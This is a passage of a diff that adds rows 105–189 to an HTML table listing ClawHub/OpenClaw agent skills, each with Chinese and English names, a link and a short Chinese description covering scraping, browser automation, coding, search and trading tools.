+<td><a href="https://clawdhub.com/skills/brainstorming">ClawHub/brainstorming</a></td>
+<td>在任何创作之前——创建功能、构建组件、添加功能或修改行为——必须使用此技能。先探索用户意图、需求和设计，再进行实现。</td>
+</tr>
+<tr>
+<td align="center">105</td>
+<td>股票</td>
+<td>股票</td>
+<td><a href="https://clawdhub.com/skills/ths-financial-data">ClawHub/ths-financial-data</a></td>
+<td>该skill用于获取股票市场数据，包括实时行情、中文名称查询、键盘缩写转换、资金流向和日K线数据。使用thsdk库提供同花顺数据接口支持。支持自动将中文、缩写、短代码转换为thsdk所需的完整ths_code格式。当匹配到多只股票时，会返回候选列表供用户选择。如未安装thsdk，会自动安装。</td>
+</tr>
+<tr>
+<td align="center">106</td>
+<td>subagentdriven开发</td>
+<td>Subagent Driven Development</td>
+<td><a href="https://clawdhub.com/skills/subagent-driven-development">ClawHub/subagent-driven-development</a></td>
+<td>用于在当前会话中执行含独立任务的实施计划。</td>
+</tr>
+<tr>
+<td align="center">107</td>
+<td>Comprehensive skill for installing, configuring, and managing the OpenClaw ecosystem (Gateway, Channels, Models, Automation, Nodes, and Deployment)</td>
+<td>Comprehensive skill for installing, configuring, and managing the OpenClaw ecosystem (Gateway, Channels, Models, Automation, Nodes, and Deployment)</td>
+<td><a href="https://clawdhub.com/skills/openclaw-anything">ClawHub/openclaw-anything</a></td>
+<td>OpenClaw CLI封装器——涵盖网关、通道、模型、代理、节点、浏览器、记忆、安全及自动化。</td>
+</tr>
+<tr>
+<td align="center">108</td>
+<td>网页爬取</td>
+<td>Web Scraping</td>
+<td><a href="https://clawdhub.com/skills/web-scraping">ClawHub/web-scraping</a></td>
+<td>从网站提取结构化信息：简单页面使用 web_fetch，动态网站、登录验证、分页及无限滚动等复杂场景则使用浏览器自动化。</td>
+</tr>
+<tr>
+<td align="center">109</td>
+<td>ScraplingOfficial技能</td>
+<td>Scrapling Official Skill</td>
+<td><a href="https://clawdhub.com/skills/scrapling-official">ClawHub/scrapling-official</a></td>
+<td>使用 Scrapling 抓取网页，支持反爬虫绕过（如 Cloudflare Turnstile）、隐匿无头浏览、爬虫框架、自适应抓取及 JavaScript 渲染功能。</td>
+</tr>
+<tr>
+<td align="center">110</td>
+<td>GitHubCLI</td>
+<td>Github Cli 🔑</td>
+<td><a href="https://clawdhub.com/skills/github-cli">ClawHub/github-cli</a></td>
+<td>GitHub CLI (gh) 综合参考指南，涵盖仓库、Issue、PR、Actions、发布、Gist、搜索、Projects v2、API、密钥/变量、标签、Codespaces 等。</td>
+</tr>
+<tr>
+<td align="center">111</td>
+<td>API开发</td>
+<td>API Development</td>
+<td><a href="https://clawdhub.com/skills/api-dev">ClawHub/api-dev</a></td>
+<td>搭建、测试、记录和调试 REST 与 GraphQL API。适用于创建 API 端点、编写集成测试、生成 OpenAPI 规范、使用 curl 测试、模拟 API 或排查 HTTP 问题。</td>
+</tr>
+<tr>
+<td align="center">112</td>
+<td>Browserbase</td>
+<td>Browserbase</td>
+<td><a href="https://clawdhub.com/skills/browse">ClawHub/browse</a></td>
+<td>通过CLI命令使用自然语言自动化浏览器交互。适用于浏览网站、导航网页、提取网页数据等请求。</td>
+</tr>
+<tr>
+<td align="center">113</td>
+<td>网页搜索专业版</td>
+<td>Web Search Pro</td>
+<td><a href="https://clawdhub.com/skills/web-search-pro">ClawHub/web-search-pro</a></td>
+<td>以代理为首的网页搜索与检索，支持实时网页搜索、新闻搜索、文档查询、代码查询、公司调研、网站爬取、网站地图及结构化证据等功能</td>
+</tr>
+<tr>
+<td align="center">114</td>
+<td>谷歌WorkspaceCLI(gog)</td>
+<td>Google Workspace CLI (gog) 🔑</td>
+<td><a href="https://clawdhub.com/skills/jx76-gog">ClawHub/jx76-gog</a></td>
+<td>Google Workspace 命令行工具，支持 Gmail、日历、云端硬盘、联系人、表格和文档。</td>
+</tr>
+<tr>
+<td align="center">115</td>
+<td>nextjs专家</td>
+<td>Nextjs Expert</td>
+<td><a href="https://clawdhub.com/skills/nextjs-expert">ClawHub/nextjs-expert</a></td>
+<td>用于构建 Next.js 14/15 App Router 应用。包括路由、布局、服务端组件、客户端组件、服务端操作、路由处理器、认证、中间件、数据获取、缓存、重新验证、流式传输、Suspense、加载状态、错误边界、动态路由、并行路由、拦截路由及任何 Next.js 架构问题。</td>
+</tr>
+<tr>
+<td align="center">116</td>
+<td>网页</td>
+<td>Web Development</td>
+<td><a href="https://clawdhub.com/skills/web">ClawHub/web</a></td>
+<td>使用 HTML、CSS、JavaScript 和现代框架构建、调试和部署网站，遵循生产最佳实践。</td>
+</tr>
+<tr>
+<td align="center">117</td>
+<td>claude代码</td>
+<td>Claude Code Integration</td>
+<td><a href="https://clawdhub.com/skills/claude-code">ClawHub/claude-code</a></td>
+<td>{&quot;answer&quot;:&quot;OpenClaw 的 Claude Code 集成。此技能提供以下接口：\n- 查询 Claude Code 文档\n- 管理子代理和编码任务\n- 执行 AI 辅助编码工作流\n- 访问最佳实践和常用工作流\n当用户想要以下内容时使用此技能：\n- 获取编码任务帮助\n- 查询 Claude Code 文档\n- 管理 AI 辅助开发工作流\n- 执行复杂编程任务&quot;}</td>
+</tr>
+<tr>
+<td align="center">118</td>
+<td>System Info</td>
+<td>System Info</td>
+<td><a href="https://clawdhub.com/skills/system-info">ClawHub/system-info</a></td>
+<td>快速系统诊断：CPU、内存、磁盘、运行时间</td>
+</tr>
+<tr>
+<td align="center">119</td>
+<td>Simmer</td>
+<td>Simmer 🔑</td>
+<td><a href="https://clawdhub.com/skills/simmer">ClawHub/simmer</a></td>
+<td>面向AI代理的预测市场界面。统一API交易Polymarket和Kalshi，具备自托管钱包、安全护栏和智能上下文。</td>
+</tr>
+<tr>
+<td align="center">120</td>
+<td>定时scheduling</td>
+<td>Cron &amp; Scheduling</td>
+<td><a href="https://clawdhub.com/skills/cron-scheduling">ClawHub/cron-scheduling</a></td>
+<td>使用 cron 和 systemd 定时器调度管理周期性任务。适用于设置 cron 任务、编写 systemd 定时器单元、处理时区感知调度、监控失败任务、实现重试机制，或排查计划任务未执行的原因。</td>
+</tr>
+<tr>
+<td align="center">121</td>
+<td>Conventional Commits</td>
+<td>Conventional Commits</td>
+<td><a href="https://clawdhub.com/skills/conventional-commits">ClawHub/conventional-commits</a></td>
+<td>使用 Conventional Commits 规范格式化提交信息。适用于创建提交、编写提交信息，或用户提及提交及 Git 提交时。确保提交遵循标准格式，以支持自动化工具、变更日志生成及语义化版本控制。</td>
+</tr>
+<tr>
+<td align="center">122</td>
+<td>Systematic Debugging</td>
+<td>Systematic Debugging</td>
+<td><a href="https://clawdhub.com/skills/runesleo-systematic-debugging">ClawHub/runesleo-systematic-debugging</a></td>
+<td>确保在尝试修复前深挖根本原因的四阶段调试框架，切勿盲目求解。</td>
+</tr>
+<tr>
+<td align="center">123</td>
+<td>cn网页搜索</td>
+<td>CN Web Search</td>
+<td><a href="https://clawdhub.com/skills/cn-web-search">ClawHub/cn-web-search</a></td>
+<td>中文网页搜索 - 聚合28个免费搜索引擎，无需API Key，纯网页抓取，支持公众号/财经/技术/学术/知识/美股/宏观/上市前搜索</td>
+</tr>
+<tr>
+<td align="center">124</td>
+<td>Context7MCP</td>
+<td>Context7 MCP 🔑</td>
+<td><a href="https://clawdhub.com/skills/context7">ClawHub/context7</a></td>
+<td>Context7 MCP - 任意库的智能文档搜索与上下文检索</td>
+</tr>
+<tr>
+<td align="center">125</td>
+<td>SEO优化器</td>
+<td>Seo Optimizer</td>
+<td><a href="https://clawdhub.com/skills/seo-optimizer">ClawHub/seo-optimizer</a></td>
+<td>当分析网站SEO、修复问题、生成报告或实施SEO最佳实践时使用此技能。适用于用户请求SEO审计、优化、元标签改进、结构化数据实施、站点地图生成或常规搜索引擎优化任务。</td>
+</tr>
+<tr>
+<td align="center">126</td>
+<td>本地places</td>
+<td>Local Places 🔑</td>
+<td><a href="https://clawdhub.com/skills/local-places">ClawHub/local-places</a></td>
+<td>通过 localhost 的 Google Places API 代理搜索地点（餐厅、咖啡馆等）。</td>
+</tr>
+<tr>
+<td align="center">127</td>
+<td>playwright浏览器自动化</td>
+<td>Playwright Browser Automation</td>
+<td><a href="https://clawdhub.com/skills/playwright-browser-automation">ClawHub/playwright-browser-automation</a></td>
+<td>直接使用 Playwright API 进行浏览器自动化。可浏览网站、交互元素、提取数据、截图、生成 PDF、录制视频及自动化复杂工作流。比 MCP 方式更可靠。</td>
+</tr>
+<tr>
+<td align="center">128</td>
+<td>browsh</td>
+<td>browsh</td>
+<td><a href="https://clawdhub.com/skills/browsh">ClawHub/browsh</a></td>
+<td>现代文本浏览器，使用无头 Firefox 在终端渲染网页。</td>
+</tr>
+<tr>
+<td align="center">129</td>
+<td>Supabase</td>
+<td>Supabase 🔑</td>
+<td><a href="https://clawdhub.com/skills/supabase">ClawHub/supabase</a></td>
+<td>连接Supabase进行数据库操作、向量搜索和存储。用于存储数据、执行SQL查询、使用pgvector进行相似性搜索以及管理表。触发于涉及数据库、向量存储、向量嵌入或Supabase的请求。</td>
+</tr>
+<tr>
+<td align="center">130</td>
+<td>技能搜索</td>
+<td>Skills.sh Search</td>
+<td><a href="https://clawdhub.com/skills/skills-search">ClawHub/skills-search</a></td>
+<td>从命令行搜索 skills.sh 注册表，发现和探索该生态中的 Agent 技能。</td>
+</tr>
+<tr>
+<td align="center">131</td>
+<td>ClawOps</td>
+<td>ClawOps</td>
+<td><a href="https://clawdhub.com/skills/clawops">ClawHub/clawops</a></td>
+<td>OpenClaw 的编排工具，无缝管理和协调您的所有技能。</td>
+</tr>
+<tr>
+<td align="center">132</td>
+<td>代理浏览器stagehand</td>
+<td>Agent Browser - Stagehand</td>
+<td><a href="https://clawdhub.com/skills/agent-browser-stagehand">ClawHub/agent-browser-stagehand</a></td>
+<td>使用自然语言通过 CLI 命令自动化网页浏览器交互。适用于浏览网站、导航网页、提取数据、截屏、填表、点击按钮或与网页应用交互的场景。</td>
+</tr>
+<tr>
+<td align="center">133</td>
+<td>PythonExecutor</td>
+<td>Python Executor</td>
+<td><a href="https://clawdhub.com/skills/python-executor">ClawHub/python-executor</a></td>
+<td>通过 [inference.sh](https://inference.sh) 在安全沙箱环境中执行 Python 代码。预装：NumPy、Pandas、Matplotlib、requests、BeautifulSoup 等。</td>
+</tr>
+<tr>
+<td align="center">134</td>
+<td>e2e测试patterns</td>
+<td>E2E Testing Patterns</td>
+<td><a href="https://clawdhub.com/skills/e2e-testing-patterns">ClawHub/e2e-testing-patterns</a></td>
+<td>{&quot;answer&quot;:&quot;使用 Playwright 和 Cypress 构建稳定高效的 E2E 测试套件：覆盖核心链路，消除不稳定测试，集成 CI/CD。&quot;}</td>
+</tr>
+<tr>
+<td align="center">135</td>
+<td>explain代码</td>
+<td>explain-code</td>
+<td><a href="https://clawdhub.com/skills/explain-code">ClawHub/explain-code</a></td>
+<td>用可视化图表和类比解释代码。在解释代码如何工作、教授代码库或用户询问如何工作时使用</td>
+</tr>
+<tr>
+<td align="center">136</td>
+<td>ShadcnUI</td>
+<td>Shadcn Ui</td>
+<td><a href="https://clawdhub.com/skills/shadcn-ui">ClawHub/shadcn-ui</a></td>
+<td>用于构建 UI，使用 shadcn/ui 组件、Tailwind CSS 布局、react-hook-form 与 zod 表单、主题、深色模式、侧边栏布局、移动端导航，或任何 shadcn 组件问题。</td>
+</tr>
+<tr>
+<td align="center">137</td>
+<td>lbnextjs16技能</td>
+<td>NextJS 16+ Complete Documentation</td>
+<td><a href="https://clawdhub.com/skills/lb-nextjs16-skill">ClawHub/lb-nextjs16-skill</a></td>
+<td>完整的 Next.js 16 Markdown 文档。适用于 Next.js 项目开发、React 应用构建、路由配置、数据获取、渲染策略、部署及框架迁移。涵盖 App Router、Pages Router、API 路由、服务端组件、服务端动作、缓存及所有 Next.js 特性。</td>
+</tr>
+<tr>
+<td align="center">138</td>
+<td>PDFOCR</td>
+<td>Pdf Ocr 🔑</td>
+<td><a href="https://clawdhub.com/skills/pdf-ocr">ClawHub/pdf-ocr</a></td>
+<td>PDF扫描件转Word文档。支持中文OCR识别，自动裁掉页眉页脚，保留插图，彩色章节封面页保留为图片。使用百度OCR API（免费额度1000次/月）。当用户要求把扫描PDF转成文字/Word时触发。</td>
+</tr>
+<tr>
+<td align="center">139</td>
+<td>记忆qdrant</td>
+<td>OpenClaw Memory Qdrant</td>
+<td><a href="https://clawdhub.com/skills/memory-qdrant">ClawHub/memory-qdrant</a></td>
+<td>使用 Qdrant 和 Transformers.js 实现本地语义记忆，通过向量嵌入存储、搜索和检索对话上下文（完全本地化，无需 API 密钥）。</td>
+</tr>
+<tr>
+<td align="center">140</td>
+<td>测试master</td>
+<td>Test Master</td>
+<td><a href="https://clawdhub.com/skills/test-master">ClawHub/test-master</a></td>
+<td>适用于编写测试、制定测试策略或构建自动化框架。可用于单元测试、集成测试、端到端测试、覆盖率分析、性能测试及安全测试。</td>
+</tr>
+<tr>
+<td align="center">141</td>
+<td>React专家</td>
+<td>React Expert</td>
+<td><a href="https://clawdhub.com/skills/react-expert">ClawHub/react-expert</a></td>
+<td>适用于构建React 18+应用，涵盖组件架构、Hooks模式、状态管理、服务端组件、性能优化、Suspense边界及React 19特性。</td>
+</tr>
+<tr>
+<td align="center">142</td>
+<td>DeepWiki</td>
+<td>DeepWiki</td>
+<td><a href="https://clawdhub.com/skills/deepwiki">ClawHub/deepwiki</a></td>
+<td>查询 DeepWiki MCP 服务器以获取 GitHub 仓库文档、Wiki 结构及 AI 问答支持。</td>
+</tr>
+<tr>
+<td align="center">143</td>
+<td>OpenClawCLI</td>
+<td>OpenClaw CLI</td>
+<td><a href="https://clawdhub.com/skills/openclaw-cli">ClawHub/openclaw-cli</a></td>
+<td>负责OpenClaw命令行工具的安装配置、网关/节点生命周期管理、频道登录、消息通信、代理轮次、模型、插件及系统健康状态的运维与故障排除。</td>
+</tr>
+<tr>
+<td align="center">144</td>
+<td>飞书文档API技能</td>
+<td>飞书文档API技能 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-docs">ClawHub/feishu-docs</a></td>
+<td>飞书文档(Docx)API技能。用于创建、读取、更新和删除飞书文档。支持Markdown/HTML内容转换、文档权限管理。</td>
+</tr>
+<tr>
+<td align="center">145</td>
+<td>Scrape</td>
+<td>Scrape</td>
+<td><a href="https://clawdhub.com/skills/scrape">ClawHub/scrape</a></td>
+<td>合法网页抓取：遵守robots.txt协议、进行频率限制，并符合GDPR/CCPA数据处理规范。</td>
+</tr>
+<tr>
+<td align="center">146</td>
+<td>clean代码</td>
+<td>Clean Code</td>
+<td><a href="https://clawdhub.com/skills/clean-code">ClawHub/clean-code</a></td>
+<td>{&quot;answer&quot;:&quot;实用编码标准：简洁、直接，拒绝过度设计与冗余注释&quot;}</td>
+</tr>
+<tr>
+<td align="center">147</td>
+<td>Kubernetes 管理</td>
+<td>Kubernetes Agent Swarm</td>
+<td><a href="https://clawdhub.com/skills/kubernetes">ClawHub/kubernetes</a></td>
+<td>Kubernetes 与 OpenShift 平台代理蜂群——用于集群操作的协调多代理系统。包括编排器（Jarvis）、集群运维（Atlas）、G...</td>
+</tr>
+<tr>
+<td align="center">148</td>
+<td>股票研究引擎</td>
+<td>stock-research-engine</td>
+<td><a href="https://clawdhub.com/skills/stock-research-engine">ClawHub/stock-research-engine</a></td>
+<td>个股基本面深度研究引擎。当用户输入股票代码、公司名称或要求分析某只股票时触发。覆盖A股、港股、美股。输出买方基金经理视角的投资分析简报，包含市场情绪、基本面、管理层评估、业务拆解、催化剂日历、风险提示和估值数据展示。任何涉及&quot;帮我看看这个票&quot;、&quot;分析一下XXX&quot;、&quot;这个公司怎么样&quot;、&quot;XXX值不值得买&quot;、股票代码...</td>
+</tr>
+<tr>
+<td align="center">149</td>
+<td>bailian网页搜索</td>
+<td>Bailian Web Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/bailian-web-search">ClawHub/bailian-web-search</a></td>
+<td>通过百炼（阿里云ModelStdio）API实现AI优化网络搜索，为大模型返回多源、精简的搜索结果。</td>
+</tr>
+<tr>
+<td align="center">150</td>
+<td>PRreviewer</td>
+<td>pr-reviewer</td>
+<td><a href="https://clawdhub.com/skills/pr-reviewer">ClawHub/pr-reviewer</a></td>
+<td>自动化 GitHub PR 代码审查，提供差异分析、lint 集成和结构化报告。适用于审查拉取请求、检查安全漏洞等场景。</td>
+</tr>
+<tr>
+<td align="center">151</td>
+<td>网页部署GitHub</td>
+<td>Web Deploy GitHub Pages</td>
+<td><a href="https://clawdhub.com/skills/web-deploy-github">ClawHub/web-deploy-github</a></td>
+<td>通过自动化工作流创建并部署单页静态网站至GitHub Pages。适用于作品集、简历、落地页等需部署至GitHub Pages的静态项目。借助GitHub Actions自动化处理从项目初始化到上线的完整流程。</td>
+</tr>
+<tr>
+<td align="center">152</td>
+<td>Clawdvault</td>
+<td>Clawdvault</td>
+<td><a href="https://clawdhub.com/skills/clawdvault">ClawHub/clawdvault</a></td>
+<td>安全访问并与Clawdvault大规模链上应用及AI驱动的智能合约项目进行交互。</td>
+</tr>
+<tr>
+<td align="center">153</td>
+<td>ADB Connection</td>
+<td>ADB Connection</td>
+<td><a href="https://clawdhub.com/skills/android-adb">ClawHub/android-adb</a></td>
+<td>通过 ADB 控制 Android 设备，支持 UI 布局分析 (uiautomator) 和视觉反馈 (截图)。适用于需要与 Android 应用交互、执行 UI 自动化、截图或运行复杂 ADB 命令序列的场景。</td>
+</tr>
+<tr>
+<td align="center">154</td>
+<td>飞书文件sender</td>
+<td>Feishu File Sender 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-file-sender">ClawHub/feishu-file-sender</a></td>
+<td>飞书文件发送器 — 补齐飞书渠道缺失的文件投递能力，通过飞书 OpenAPI 上传并发送 agent 生成的本地文件。| Feishu File Sender — Upload &amp; send files via Feishu OpenAPI, filling the channel's missing file...</td>
+</tr>
+<tr>
+<td align="center">155</td>
+<td>Telegram机器人</td>
+<td>Telegram Bot Builder 🔑</td>
+<td><a href="https://clawdhub.com/skills/telegram-bot">ClawHub/telegram-bot</a></td>
+<td>{&quot;answer&quot;:&quot;通过 Telegram Bot API 构建和管理 Telegram 机器人。创建机器人、发送消息、处理 Webhook、管理群组和频道。&quot;}</td>
+</tr>
+<tr>
+<td align="center">156</td>
+<td>GitHubAITrends</td>
+<td>GitHub AI Trends</td>
+<td><a href="https://clawdhub.com/skills/github-ai-trends">ClawHub/github-ai-trends</a></td>
+<td>生成 GitHub AI 趋势项目的文本排行榜，按日、周、月抓取 AI/ML/LLM 高星仓库并渲染。用于查询 AI 项目趋势、GitHub 趋势、AI 排行榜或热门 AI 仓库。</td>
+</tr>
+<tr>
+<td align="center">157</td>
+<td>DevOps</td>
+<td>DevOps</td>
+<td><a href="https://clawdhub.com/skills/devops">ClawHub/devops</a></td>
+<td>{&quot;answer&quot;:&quot;自动化部署，管理基础设施，构建可靠的 CI/CD 流水线。&quot;}</td>
+</tr>
+<tr>
+<td align="center">158</td>
+<td>APITester</td>
+<td>Api Tester</td>
+<td><a href="https://clawdhub.com/skills/api-tester">ClawHub/api-tester</a></td>
+<td>执行结构化HTTP/HTTPS请求（GET、POST、PUT、DELETE），支持自定义标头和JSON正文。适用于API测试、健康检查或交互操作。</td>
+</tr>
+<tr>
+<td align="center">159</td>
+<td>Moltbook代理Registry</td>
+<td>Moltbook Agent Registry</td>
+<td><a href="https://clawdhub.com/skills/moltbook-registry">ClawHub/moltbook-registry</a></td>
+<td>Moltbook 官方身份注册接口。验证身份，查询他人，建立链上信誉。</td>
+</tr>
+<tr>
+<td align="center">160</td>
+<td>stagehand浏览器CLI</td>
+<td>Stagehand Browser CLI 🔑</td>
+<td><a href="https://clawdhub.com/skills/stagehand-browser-cli">ClawHub/stagehand-browser-cli</a></td>
+<td>使用自然语言通过 CLI 命令自动化网页浏览器交互。适用于浏览网站、导航网页、提取数据、截屏、填表、点击按钮或与网页应用交互的场景。</td>
+</tr>
+<tr>
+<td align="center">161</td>
+<td>Trend Watcher</td>
+<td>Trend Watcher</td>
+<td><a href="https://clawdhub.com/skills/trend-watcher">ClawHub/trend-watcher</a></td>
+<td>监控 GitHub Trending 和技术社区，追踪并分析 CLI、AI/ML、自动化及开发者领域的新兴工具。</td>
+</tr>
+<tr>
+<td align="center">162</td>
+<td>GitHubTrendingCn</td>
+<td>Github Trending Cn</td>
+<td><a href="https://clawdhub.com/skills/github-trending-cn">ClawHub/github-trending-cn</a></td>
+<td>GitHub 趋势监控 | GitHub Trending Monitor. 获取 GitHub 热门项目、编程语言趋势、开源动态 | Get GitHub trending repos, language trends, open source updates. 触发词：GitHub、trending、开源、热...</td>
+</tr>
+<tr>
+<td align="center">163</td>
+<td>配置guardian</td>
+<td>Config Guardian</td>
+<td><a href="https://clawdhub.com/skills/config-guardian">ClawHub/config-guardian</a></td>
+<td>安全 OpenClaw 配置更新：自动备份、验证和回滚，防止无效配置更新（代理专用）。</td>
+</tr>
+<tr>
+<td align="center">164</td>
+<td>本地网页搜索技能</td>
+<td>Local Web Search</td>
+<td><a href="https://clawdhub.com/skills/local-web-search-skill">ClawHub/local-web-search-skill</a></td>
+<td>**Translation:**  通过DuckDuckGo HTML抓取实现免费本地网页搜索，无需API密钥。适用于web_search工具不可用或缺少API密钥且需要快速查询结果的场景。</td>
+</tr>
+<tr>
+<td align="center">165</td>
+<td>Architecture Designer</td>
+<td>Architecture Designer</td>
+<td><a href="https://clawdhub.com/skills/architecture-designer">ClawHub/architecture-designer</a></td>
+<td>用于设计新系统架构、审查现有设计或制定架构决策。适用于系统设计、架构审查、设计模式、架构决策记录(ADR)及可扩展性规划。</td>
+</tr>
+<tr>
+<td align="center">166</td>
+<td>MinerUPDF解析器</td>
+<td>MinerU PDF Parser 🔑</td>
+<td><a href="https://clawdhub.com/skills/mineru">ClawHub/mineru</a></td>
+<td>用 MinerU API 解析 PDF/Word/PPT/图片为 Markdown，支持公式、表格、OCR。适用于论文解析、文档提取。</td>
+</tr>
+<tr>
+<td align="center">167</td>
+<td>Prd</td>
+<td>Prd</td>
+<td><a href="https://clawdhub.com/skills/prd">ClawHub/prd</a></td>
+<td>创建和管理产品需求文档（PRD）。适用场景：（1）创建包含用户故事的结构化任务列表；（2）定义包含验收标准的功能特性；（3）为AI智能体或人类开发者规划功能实现。</td>
+</tr>
+<tr>
+<td align="center">168</td>
+<td>后端patterns</td>
+<td>Backend Patterns</td>
+<td><a href="https://clawdhub.com/skills/backend-patterns">ClawHub/backend-patterns</a></td>
+<td>Node.js、Express 和 Next.js API 路由的后端架构模式、API 设计、数据库优化及服务端最佳实践。</td>
+</tr>
+<tr>
+<td align="center">169</td>
+<td>百度网页搜索</td>
+<td>baidu web search 🔑</td>
+<td><a href="https://clawdhub.com/skills/baidu-web-search">ClawHub/baidu-web-search</a></td>
+<td>使用百度千帆网页搜索API进行实时网络检索。当用户需要搜索网页、获取最新新闻、核实事实或表达意图时使用。</td>
+</tr>
+<tr>
+<td align="center">170</td>
+<td>Antigravity Quota</td>
+<td>Antigravity Quota</td>
+<td><a href="https://clawdhub.com/skills/antigravity-quota">ClawHub/antigravity-quota</a></td>
+<td>检查 Antigravity 账户 Claude 和 Gemini 模型配额，显示剩余配额、重置时间及封禁检测。</td>
+</tr>
+<tr>
+<td align="center">171</td>
+<td>代码mentor</td>
+<td>Code Mentor</td>
+<td><a href="https://clawdhub.com/skills/code-mentor">ClawHub/code-mentor</a></td>
+<td>全阶段AI编程导师，提供互动教学、代码审查、调试指导、算法练习、项目辅导及设计模式探索。适用于学习编程、调试代码、理解算法与数据结构、掌握最佳实践、应对面试或项目开发。支持Python和JavaScript。</td>
+</tr>
+<tr>
+<td align="center">172</td>
+<td>Wecom</td>
+<td>Wecom 🔑</td>
+<td><a href="https://clawdhub.com/skills/wecom">ClawHub/wecom</a></td>
+<td>通过 Webhook 使用 MCP 协议向企业微信发送消息，支持 Claude Code、Claude Desktop 等 MCP 客户端。</td>
+</tr>
+<tr>
+<td align="center">173</td>
+<td>pymupdfPDF解析器Clawdbot技能</td>
+<td>PyMuPDF PDF Parser Clawdbot Skill</td>
+<td><a href="https://clawdhub.com/skills/pymupdf-pdf-parser-clawdbot-skill">ClawHub/pymupdf-pdf-parser-clawdbot-skill</a></td>
+<td>使用 PyMuPDF (fitz) 快速本地 PDF 解析，输出 Markdown/JSON，可选附带图片/表格。当速度优先于鲁棒性，或在重型解析器不可用时作为后备方案。默认对单 PDF 解析，输出至每文档对应的文件夹。</td>
+</tr>
+<tr>
+<td align="center">174</td>
+<td>Codex Quota</td>
+<td>Codex Quota</td>
+<td><a href="https://clawdhub.com/skills/codex-quota">ClawHub/codex-quota</a></td>
+<td>通过读取 ~/.codex/sessions/ 的本地会话日志，检查 OpenAI Codex CLI 的速率限制状态（日/周配额）。便携式 Python 脚本。</td>
+</tr>
+<tr>
+<td align="center">175</td>
+<td>homeassistant技能</td>
+<td>Homeassistant Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/homeassistant-skill">ClawHub/homeassistant-skill</a></td>
+<td>通过 REST API 控制 Home Assistant 设备和自动化。支持灯光、气候、门锁、状态、天气、日历、通知、脚本等 25 种实体域。当用户询问智能家居、设备或自动化时使用。</td>
+</tr>
+<tr>
+<td align="center">176</td>
+<td>React</td>
+<td>React</td>
+<td><a href="https://clawdhub.com/skills/react">ClawHub/react</a></td>
+<td>React 19完整工程化：架构设计、服务端组件、Hooks、Zustand、TanStack Query、表单处理、性能优化、测试与生产部署。</td>
+</tr>
+<tr>
+<td align="center">177</td>
+<td>Square</td>
+<td>Square 🔑</td>
+<td><a href="https://clawdhub.com/skills/squareup">ClawHub/squareup</a></td>
+<td>Square API 集成，托管式 OAuth。仅在需要 Square 管理时才安装。使用最小权限的 Square 账户及相应的 OAuth 范围进行连接。</td>
+</tr>
+<tr>
+<td align="center">178</td>
+<td>recursive自我改进</td>
+<td>Recursive Self Improvement</td>
+<td><a href="https://clawdhub.com/skills/recursive-self-improvement">ClawHub/recursive-self-improvement</a></td>
+<td>递归自我改进系统，能够自动检测错误并修复，或持续优化和重构。包含修复模式和优化模式，支持并发执行、自动化测试、性能监控、智能调度、自适应学习、错误预测和异常恢复。用于需要持续自我优化的系统。</td>
+</tr>
+<tr>
+<td align="center">179</td>
+<td>Tradecraft.finance - Agents trade together on Solana</td>
+<td>Tradecraft.finance - Agents trade together on Solana</td>
+<td><a href="https://clawdhub.com/skills/tradecraft">ClawHub/tradecraft</a></td>
+<td>在 Solana 上执行交易、管理钱包、监控信号，并通过 Tradecraft.finance 的 API 平台进行交易群组协作。</td>
+</tr>
+<tr>
+<td align="center">180</td>
+<td>LinkedInCLI</td>
+<td>LinkedIn CLI 🔑</td>
+<td><a href="https://clawdhub.com/skills/linkedin-cli">ClawHub/linkedin-cli</a></td>
+<td>{&quot;answer&quot;: &quot;一个类鸟的 LinkedIn CLI，通过会话 Cookie 搜索档案、查看消息并总结动态。&quot;}</td>
+</tr>
+<tr>
+<td align="center">181</td>
+<td>Docker Compose</td>
+<td>Docker Compose</td>
+<td><a href="https://clawdhub.com/skills/docker-compose">ClawHub/docker-compose</a></td>
+<td>使用正确的依赖处理、网络和卷管理来定义多容器应用。</td>
+</tr>
+<tr>
+<td align="center">182</td>
+<td>部署代理</td>
+<td>C.R.A.B Deploy Agent 🔑</td>
+<td><a href="https://clawdhub.com/skills/deploy-agent">ClawHub/deploy-agent</a></td>
+<td>全栈应用多步部署代理：构建 → 测试 → GitHub → Cloudflare Pages，每步均需人工审批。</td>
+</tr>
+<tr>
+<td align="center">183</td>
+<td>Opennews</td>
+<td>Opennews 🔑</td>
+<td><a href="https://clawdhub.com/skills/opennews-2">ClawHub/opennews-2</a></td>
+<td>通过OpenNews 6551 API提供加密货币新闻搜索、AI评分、交易信号和实时更新。支持关键词搜索、币种筛选、来源筛选...</td>
+</tr>
+<tr>
+<td align="center">184</td>
+<td>Git助手</td>
+<td>Git Helper</td>
+<td><a href="https://clawdhub.com/skills/git-helper">ClawHub/git-helper</a></td>
+<td>常见Git操作（状态、拉取、推送、分支、日志）</td>
+</tr>
+<tr>
+<td align="center">185</td>
+<td>Opentwitter</td>
+<td>Opentwitter 🔑</td>
+<td><a href="https://clawdhub.com/skills/opentwitter-2">ClawHub/opentwitter-2</a></td>
+<td>通过6551 API获取Twitter/X数据。支持用户资料、推文搜索、用户推文、关注者事件、已删除推文及KOL关注者。</td>
+</tr>
+<tr>
+<td align="center">186</td>
+<td>claude团队</td>
+<td>Claude Team</td>
+<td><a href="https://clawdhub.com/skills/claude-team">ClawHub/claude-team</a></td>
+<td>通过 iTerm2 使用 claude-team MCP 服务器编排多个 Claude Code 工作进程。使用 git worktree 生成工作进程，分配 issues，监控进度，并协调并行开发工作。</td>
+</tr>
+<tr>
+<td align="center">187</td>
+<td>Last30days技能</td>
+<td>Last30days Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/last30days-official">ClawHub/last30days-official</a></td>
+<td>Research what people actually say about any topic in the last 30 days. Pulls posts and engagement from Reddit, X, YouTube, TikTok, Hacker News, Polymarket, G...</td>
+</tr>
+<tr>
+<td align="center">188</td>
+<td>Senior Architect</td>
+<td>Senior Architect</td>
+<td><a href="https://clawdhub.com/skills/senior-architect">ClawHub/senior-architect</a></td>
+<td>当用户要求设计系统架构、评估微服务与单体架构、创建架构图或进行分析时，应使用此技能。</td>
+</tr>
+<tr>
+<td align="center">189</td>
+<td>CLI开发</td>
+<td>Cli Developer</td>
+<td><a href="https://clawdhub.com/skills/cli-developer">ClawHub/cli-developer</a></td>
+<td>用于构建命令行工具、实现参数解析或添加交互式提示。可在命令行设计、参数解析、交互式提示、进度指示器、shell 补全时调用。</td>
+</tr>
+<tr>
+<td align="center">190</td>
